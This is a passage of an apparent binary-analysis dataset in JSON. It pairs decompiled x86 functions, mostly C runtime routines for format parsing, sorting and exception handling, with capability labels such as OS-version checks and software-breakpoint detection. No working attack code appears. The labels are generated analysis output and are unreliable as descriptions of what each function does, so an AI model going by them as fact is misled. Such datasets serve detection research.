0xffffffff;\ncode_r0x0049cf49:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049cf6f;\n}\n",
        "token_count": 951
    },
    "00403995": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403995(code *arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.pDNameNode.0;\n    if ((arg_8h != NULL) && ((arg_8h[4] == 0x2 || (arg_8h[4] == 0x3)))) {\n        arg_8h = NULL;\n    }\n    in_ECX[1] = arg_8h;\n    return;\n}\n",
        "token_count": 108
    },
    "0040427d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.0040427d(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004054b6();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049d26b:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d258:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d26b;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00403ec7(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49d286\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00403f3a();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d258;\n                    case 2:\n                        cVar1 = fcn.00401523();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00401816();\n                        break;\n                    case 4:\n                        goto code_r0x0049d232;\n                    case 5:\n                        cVar1 = fcn.00405d35();\n                        break;\n                    case 6:\n                        cVar1 = fcn.004067f3();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00401f05(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d1c5;\n                    default:\n                        goto code_r0x0049d1b2;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d258;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n            } while( true );\n        }\ncode_r0x0049d1b2:\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\ncode_r0x0049d1c5:\n    return 0xffffffff;\ncode_r0x0049d232:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d258;\n}\n",
        "token_count": 939
    },
    "004044df": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004044df(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d83();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049d761:\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d808:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d81f;\n                    uVar4 = fcn.004055ce(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49d849\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00401154();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d808;\n                    case 2:\n                        cVar2 = fcn.004019ec();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00401a4b();\n                        break;\n                    case 4:\n                        goto code_r0x0049d7e2;\n                    case 5:\n                        cVar2 = fcn.004024eb();\n                        break;\n                    case 6:\n                        cVar2 = fcn.0040551a();\n                        break;\n                    case 7:\n                        cVar2 = fcn.004035a3();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d774;\n                    default:\n                        goto code_r0x0049d761;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d808;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049d81f:\n                cVar2 = fcn.00403dbe();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049d774:\n    return 0xffffffff;\ncode_r0x0049d7e2:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d808;\n}\n",
        "token_count": 833
    },
    "00404773": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404773(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405a15();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049d6bc:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d6a5:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d6bc;\n                    uVar4 = fcn.00404dae(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49d6da\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00406744();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d6a5;\n                    case 2:\n                        cVar2 = fcn.00403242();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00402527();\n                        break;\n                    case 4:\n                        goto code_r0x0049d67f;\n                    case 5:\n                        cVar2 = fcn.00405353();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00405718();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00402f95();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d611;\n                    default:\n                        goto code_r0x0049d5fe;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d6a5;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            } while( true );\n        }\ncode_r0x0049d5fe:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\ncode_r0x0049d611:\n    return 0xffffffff;\ncode_r0x0049d67f:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d6a5;\n}\n",
        "token_count": 817
    },
    "00404d4a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404d4a(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0xe) != 1) goto code_r0x004a8726;\n    in_EAX = *(param_1 + 8);\n    uVar1 = *in_EAX;\n    if (uVar1 == 0x25) goto code_r0x004a8726;\n    iVar2 = *(param_1 + 0x22e);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n            *(param_1 + 0x22e) = 1;\n            iVar2 = 1;\n            goto code_r0x004a8735;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00403675(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != 0x24)) {\n            *(param_1 + 0x22e) = 1;\n            goto code_r0x004a8726;\n        }\n        if (*(param_1 + 0x22c) == 1) {\n            fcn.00403189(param_1 + 0x232, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 8);\n        *(param_1 + 0x22e) = 2;\n    }\n    else {\ncode_r0x004a8735:\n        if (iVar2 != 2) goto code_r0x004a8726;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00403675(in_EAX, &var_8h, 10);\n    puVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0x554) = puVar5;\n    *(param_1 + 8) = in_EAX;\n    if (*(param_1 + 0x22c) == 1) {\n        if (((puVar5 < 0) || (*var_8h != 0x24)) || (99 < puVar5)) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            uVar4 = fcn.004037ce();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0x552);\n        if (puVar5 <= in_EAX) {\n            puVar5 = in_EAX;\n        }\n        *(param_1 + 0x552) = puVar5;\n    }\ncode_r0x004a8726:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 732
    },
    "00404f6b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404f6b(char *param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x1c) != 1) goto code_r0x004a85ea;\n    in_EAX = *(param_1 + 0x10);\n    cVar1 = *in_EAX;\n    if (cVar1 == '%') goto code_r0x004a85ea;\n    iVar2 = *(param_1 + 0x45c);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((cVar1 < '0') || ('9' < cVar1)) {\n            *(param_1 + 0x45c) = 1;\n            iVar2 = 1;\n            goto code_r0x004a85f8;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00404999(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != '$')) {\n            *(param_1 + 0x45c) = 1;\n            goto code_r0x004a85ea;\n        }\n        if (*(param_1 + 0x458) == 1) {\n            fcn.00403189(param_1 + 0x464, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 0x10);\n        *(param_1 + 0x45c) = 2;\n    }\n    else {\ncode_r0x004a85f8:\n        if (iVar2 != 2) goto code_r0x004a85ea;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00404999(in_EAX, &var_8h, 10);\n    pcVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0xaa8) = pcVar5;\n    *(param_1 + 0x10) = in_EAX;\n    if (*(param_1 + 0x458) == 1) {\n        if (((pcVar5 < 0) || (*var_8h != '$')) || (99 < pcVar5)) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            uVar4 = fcn.004037ce();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0xaa4);\n        if (pcVar5 <= in_EAX) {\n            pcVar5 = in_EAX;\n        }\n        *(param_1 + 0xaa4) = pcVar5;\n    }\ncode_r0x004a85ea:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 716
    },
    "0040568c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.0040568c(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h, code *arg_14h)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    uchar *var_10ch;\n    uint var_108h;\n    uchar *var_104h;\n    uint var_100h;\n    uchar *var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_104h = arg_8h;\n    if ((((arg_8h == NULL) && (arg_ch != 0)) || (arg_10h == 0)) || (arg_14h == NULL)) {\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        var_118h = 0;\n        if (1 < arg_ch) {\n            puVar7 = arg_8h + (arg_ch - 1) * arg_10h;\ncode_r0x004dc802:\n            while (uVar4 = (puVar7 - var_104h) / arg_10h + 1,  8 < uVar4) {\n                iVar5 = (uVar4 >> 1) * arg_10h;\n                puVar8 = var_104h + iVar5;\n                (**0x578000)(var_104h, puVar8);\n                iVar6 = (*arg_14h)();\n                if ((0 < iVar6) && (uVar4 = arg_10h,  puVar10 = puVar8,  var_104h != puVar8)) {\n                    do {\n                        uVar2 = puVar10[-iVar5];\n                        puVar10[-iVar5] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar10 + 1;\n                    } while (uVar4 != 0);\n                }\n                (**0x578000)(var_104h, puVar7);\n                iVar5 = (*arg_14h)();\n                if ((0 < iVar5) && (uVar4 = arg_10h,  puVar10 = puVar7,  var_104h != puVar7)) {\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar2 = puVar9[var_104h + (-1 - puVar7)];\n                        puVar9[var_104h + (-1 - puVar7)] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar9;\n                    } while (uVar4 != 0);\n                }\n                (**0x578000)(puVar8, puVar7);\n                iVar5 = (*arg_14h)();\n                var_10ch = var_104h;\n                var_fch = puVar7;\n                if ((0 < iVar5) && (uVar4 = arg_10h,  puVar10 = puVar7,  puVar8 != puVar7)) {\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar2 = puVar9[puVar8 + (-1 - puVar7)];\n                        puVar9[puVar8 + (-1 - puVar7)] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar9;\n                    } while (uVar4 != 0);\n                }\ncode_r0x004dca13:\n                if (var_10ch < puVar8) {\n                    do {\n                        var_10ch = var_10ch + arg_10h;\n                        if (puVar8 <= var_10ch) goto code_r0x004dca60;\n                        (**0x578000)(var_10ch, puVar8);\n                        iVar5 = (*arg_14h)();\n                        puVar10 = var_fch;\n                    } while (iVar5 < 1);\n                }\n                else {\ncode_r0x004dca60:\n                    do {\n                        var_10ch = var_10ch + arg_10h;\n                        puVar10 = var_fch;\n                        if (puVar7 < var_10ch) break;\n                        (**0x578000)(var_10ch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 < 1);\n                }\n                do {\n                    var_fch = puVar10;\n                    puVar10 = var_fch + -arg_10h;\n                    if (puVar10 <= puVar8) break;\n                    (**0x578000)(puVar10, puVar8);\n                    iVar5 = (*arg_14h)();\n                } while (0 < iVar5);\n                if (var_10ch <= puVar10) {\n                    puVar9 = puVar10;\n                    uVar4 = arg_10h;\n                    if (puVar10 != var_10ch) {\n                        do {\n                            puVar1 = puVar9 + 1;\n                            uVar2 = puVar1[var_10ch + (-1 - puVar10)];\n                            puVar1[var_10ch + (-1 - puVar10)] = *puVar9;\n                            *puVar9 = uVar2;\n                            uVar4 = uVar4 - 1;\n                            puVar9 = puVar1;\n                        } while (uVar4 != 0);\n                    }\n                    var_fch = puVar10;\n                    if (puVar8 == puVar10) {\n                        puVar8 = var_10ch;\n                    }\n                    goto code_r0x004dca13;\n                }\n                if (puVar8 < var_fch) {\n                    do {\n                        var_fch = var_fch + -arg_10h;\n                        if (var_fch <= puVar8) goto code_r0x004dcb80;\n                        (**0x578000)(var_fch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 == 0);\n                }\n                else {\ncode_r0x004dcb80:\n                    do {\n                        var_fch = var_fch + -arg_10h;\n                        if (var_fch <= var_104h) break;\n                        (**0x578000)(var_fch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 == 0);\n                }\n                if (var_fch - var_104h < puVar7 - var_10ch) goto code_r0x004dcc0a;\n                if (var_104h < var_fch) {\n                    (&var_7ch)[var_118h] = var_104h;\n                    (&var_f4h)[var_118h] = var_fch;\n                    var_118h = var_118h + 1;\n                }\n                var_104h = var_10ch;\n                if (puVar7 <= var_10ch) goto code_r0x004dcc43;\n            }\n            for (; puVar10 = var_104h,  puVar8 = var_104h,  var_104h < puVar7; puVar7 = puVar7 + -arg_10h) {\n                while (puVar8 = puVar8 + arg_10h,  puVar8 <= puVar7) {\n                    (**0x578000)(puVar8, puVar10);\n                    iVar5 = (*arg_14h)();\n                    if (0 < iVar5) {\n                        puVar10 = puVar8;\n                    }\n                }\n                if (puVar10 != puVar7) {\n                    puVar8 = puVar7;\n                    uVar4 = arg_10h;\n                    do {\n                        uVar2 = puVar8[puVar10 - puVar7];\n                        (puVar8 + 1)[(puVar10 - puVar7) + -1] = *puVar8;\n                        *puVar8 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar8 = puVar8 + 1;\n                    } while (uVar4 != 0);\n                }\n            }\n            goto code_r0x004dcc43;\n        }\n    }\ncode_r0x004dc7ce:\n    fcn.004030bc(var_118h);\n    return;\ncode_r0x004dcc0a:\n    if (var_10ch < puVar7) {\n        (&var_7ch)[var_118h] = var_10ch;\n        (&var_f4h)[var_118h] = puVar7;\n        var_118h = var_118h + 1;\n    }\n    puVar7 = var_fch;\n    if (var_fch <= var_104h) {\ncode_r0x004dcc43:\n        var_118h = var_118h + -1;\n        if (-1 < var_118h) {\n            var_104h = (&var_7ch)[var_118h];\n            puVar7 = (&var_f4h)[var_118h];\n            goto code_r0x004dc802;\n        }\n        goto code_r0x004dc7ce;\n    }\n    goto code_r0x004dc802;\n}\n",
        "token_count": 2178
    },
    "00406145": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00406145(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403d28();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049ca87:\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049cb2d:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049cb40;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00401b18(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49cb6b\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00405010();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049cb2d;\n                    case 2:\n                        cVar1 = fcn.00406721();\n                        break;\n                    case 3:\n                        cVar1 = fcn.004022a7();\n                        break;\n                    case 4:\n                        goto code_r0x0049cb07;\n                    case 5:\n                        cVar1 = fcn.00402833();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00403689();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004023a6(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049ca9a;\n                    default:\n                        goto code_r0x0049ca87;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049cb2d;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049cb40:\n                cVar1 = fcn.00404b24();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049ca9a:\n    return 0xffffffff;\ncode_r0x0049cb07:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049cb2d;\n}\n",
        "token_count": 955
    },
    "0040116d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040116d(int32_t arg_8h, int32_t **arg_ch)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    \n    if ((((arg_ch == NULL) || (piVar8 = *arg_ch,  piVar8 == NULL)) || (*piVar8 != -0x1f928c9d)) ||\n       ((piVar8[4] != 3 || (((piVar8[5] != 0x19930520 && (piVar8[5] != 0x19930521)) && (piVar8[5] != 0x19930522)))))) {\n        fcn.00404f39();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    piVar8 = *(piVar8[7] + 0xc);\n    iVar6 = *piVar8;\n    do {\n        if (iVar6 < 1) {\n            return 0;\n        }\n        piVar8 = piVar8 + 1;\n        puVar7 = arg_8h + 8;\n        puVar3 = *(*piVar8 + 4) + 8;\n        do {\n            uVar1 = *puVar7;\n            bVar9 = uVar1 < *puVar3;\n            if (uVar1 != *puVar3) {\ncode_r0x00485d3a:\n                uVar4 = -bVar9 | 1;\n                goto code_r0x00485d3f;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar7[1];\n            bVar9 = uVar1 < puVar3[1];\n            if (uVar1 != puVar3[1]) goto code_r0x00485d3a;\n            puVar7 = puVar7 + 2;\n            puVar3 = puVar3 + 2;\n        } while (uVar1 != 0);\n        uVar4 = 0;\ncode_r0x00485d3f:\n        if (uVar4 == 0) {\n            return 1;\n        }\n        iVar6 = iVar6 + -1;\n    } while( true );\n}\n",
        "token_count": 551
    },
    "0040324c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040324c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int32_t arg_ch;\n    code *pcVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f080, 8);\n    piVar1 = *(unaff_EBP + 8);\n    if ((((piVar1 != NULL) && (*piVar1 == -0x1f928c9d)) && (piVar1[4] == 3)) &&\n       ((((piVar1[5] == 0x19930520 || (piVar1[5] == 0x19930521)) || (piVar1[5] == 0x19930522)) &&\n        (puVar2 = piVar1[7],  puVar2 != NULL)))) {\n        arg_ch = *(puVar2 + 4);\n        if (arg_ch == 0) {\n            if (((*puVar2 & 0x10) != 0) && (piVar1 = *piVar1[6],  piVar1 != NULL)) {\n                pcVar3 = *(*piVar1 + 8);\n                (**0x578000)(piVar1);\n                (*pcVar3)();\n            }\n        }\n        else {\n            *(unaff_EBP + -4) = 0;\n            fcn.004029d7(piVar1[6], arg_ch);\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 403
    },
    "004045ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045ed(uint *arg_8h)\n\n{\n    char *pcVar1;\n    \n    if ((((**0x574458 != '\\0') && (**0x574458 == '_')) && ((*0x574458)[1] != '\\0')) && ((*0x574458)[1] == '_')) {\n        pcVar1 = *0x574458 + 2;\n        *0x574458 = *0x574458 + 3;\n        if (3 < *pcVar1 - 0x41U) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return;\n        }\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return;\n}\n",
        "token_count": 189
    },
    "0040493a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040493a(uint32_t arg_8h)\n\n{\n    if (arg_8h < 4) {\n        return arg_8h * 0xc + 0x555dcc;\n    }\n    return 0x555df0;\n}\n",
        "token_count": 63
    },
    "00405673": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405673(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t in_EDX;\n    uint32_t extraout_EDX;\n    uint32_t arg_8h_00;\n    uint32_t in_stack_ffffffe0;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    uVar2 = in_EDX & 0xffffff00 | *arg_8h;\n    do {\n        if ((uVar2 != *(iVar4 + 0x558678)) && (uVar2 != *(iVar4 + 0x55867c))) {\n            fcn.004b6cda();\n            return in_stack_ffffffe0;\n        }\n        uVar3 = **arg_ch;\n        uVar2 = uVar2 & 0xffffff00 | uVar3;\n        iVar4 = iVar4 + 1;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar3;\n    } while (iVar4 != 3);\n    fcn.00402e0a(uVar2);\n    uVar3 = **arg_ch;\n    *arg_ch = *arg_ch + 1;\n    *arg_8h = uVar3;\n    if (uVar3 == 0x28) {\n        uVar3 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar3;\n        cVar1 = fcn.00404e08(arg_8h, arg_ch);\n        if (cVar1 != '\\0') {\n            uVar2 = *arg_8h;\n            fcn.00402e0a(uVar2);\n            return 